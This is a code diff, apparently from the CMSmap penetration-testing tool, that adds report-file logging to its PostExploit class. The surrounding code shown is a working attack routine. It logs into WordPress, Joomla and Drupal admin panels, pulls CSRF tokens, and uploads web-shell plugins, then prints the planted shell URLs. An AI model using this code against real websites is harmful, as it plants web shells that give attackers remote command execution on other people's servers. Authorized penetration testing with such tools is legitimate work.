@@ -1062,7 +1062,8 @@ class PostExploit:
         cookieJar.clear()
         try: 
             # Login in WordPress - HTTP Post
-            if verbose : print "[-] Logining on the target website ..."
+            if verbose : msg ="[-] Logining on the target website ..."; print msg
+            if output : report.WriteTextFile(msg)
             opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
             # Request WordPress Plugin Upload page
             htmltext = opener.open(self.url+self.wppluginpage).read()
@@ -1071,9 +1072,12 @@ class PostExploit:
             self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("shell/wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
             htmltext = opener.open(self.url+self.wpupload, self.params).read()
             if re.search("Plugin installed successfully",htmltext):
-                print_red("[!] CMSmap WordPress Shell Plugin Installed")
-                print_red_bold("[!] Web Shell: "+self.url+"/wp-content/plugins/wp-shell/shell.php")
-                print_yellow("[-] Remember to delete CMSmap WordPress Shell Plugin")
+                msg = "[!] CMSmap WordPress Shell Plugin Installed"; print_red(msg)
+                if output : report.WriteTextFile(msg)
+                msg = "[!] Web Shell: "+self.url+"/wp-content/plugins/wp-shell/shell.php"; print_red_bold(msg)
+                if output : report.WriteTextFile(msg)
+                msg = "[-] Remember to delete CMSmap WordPress Shell Plugin"; print_yellow(msg)
+                if output : report.WriteTextFile(msg)
         
         except urllib2.HTTPError, e:
             #print e.code
@@ -1142,7 +1146,8 @@ class PostExploit:
         cookieJar.clear()
         try:
             # HTTP POST Request
-            if verbose : print "[-] Logging into the target website ..."
+            if verbose : msg="[-] Logging into the target website ..."; print msg
+            if output : report.WriteTextFile(msg)
             # Get Token and Session Cookie
             htmltext = opener.open(self.url+self.joologin).read()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
@@ -1160,11 +1165,15 @@ class PostExploit:
                 self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
                 htmltext = opener.open(self.url+self.jooupload, self.params).read()
                 if re.search("Installing component was successful.",htmltext):
-                    print_red("[!] CMSmap Joomla Shell Plugin Installed")
-                    print_red_bold("[!] Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php")
-                    print_yellow("[-] Remember to unistall CMSmap Joomla Shell Component")
+                    msg ="[!] CMSmap Joomla Shell Plugin Installed"; print_red(msg)
+                    if output : report.WriteTextFile(msg)
+                    msg = "[!] Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php"; print_red_bold(msg)
+                    if output : report.WriteTextFile(msg)
+                    msg = "[-] Remember to unistall CMSmap Joomla Shell Component"; print_yellow(msg)
+                    if output : report.WriteTextFile(msg)
             except AttributeError:
-                print "[-] "+user+" in not admin"
+                msg = "[-] "+user+" in Not admin"; print msg
+                if output : report.WriteTextFile(msg)
         except urllib2.HTTPError, e:
             # print e.code
             pass
@@ -1254,7 +1263,8 @@ class PostExploit:
         cookieJar.clear()        
         try:
             # HTTP POST Request
-            if verbose : print "[-] Logging into the target website..."
+            if verbose : msg = "[-] Logging into the target website..."; print msg
+            if output : report.WriteTextFile(msg)
             # Logging into the website with username and password
             self.query_args_login = {"name": user ,"pass": password, "form_id":"user_login"}
             data = urllib.urlencode(self.query_args_login)
@@ -1270,9 +1280,12 @@ class PostExploit:
             try:
                 htmltext = opener.open(self.url+"/authorize.php?batch=1&op=start&id="+self.dru_id[0]).read()
                 if re.search("Installing drushell",htmltext):
-                    print_red("[!] CMSmap Drupal Shell Module Installed")
-                    print_red_bold("[!] Web Shell: "+self.url+"/sites/all/modules/drushell/shell.php")
-                    print_yellow("[-] Remember to delete CMSmap Drupal Shell Module")
+                    msg = "[!] CMSmap Drupal Shell Module Installed"; print_red(msg)
+                    if output : report.WriteTextFile(msg)
+                    msg = "[!] Web Shell: "+self.url+"/sites/all/modules/drushell/shell.php"; print_red_bold(msg)
+                    if output : report.WriteTextFile(msg)
+                    msg = "[-] Remember to delete CMSmap Drupal Shell Module"; print_yellow(msg)
+                    if output : report.WriteTextFile(msg)
             except IndexError :
                 if verbose : print "[-] Unable to install CMSmap Drupal Shell Module. Check if it is already installed"
         except urllib2.HTTPError, e:
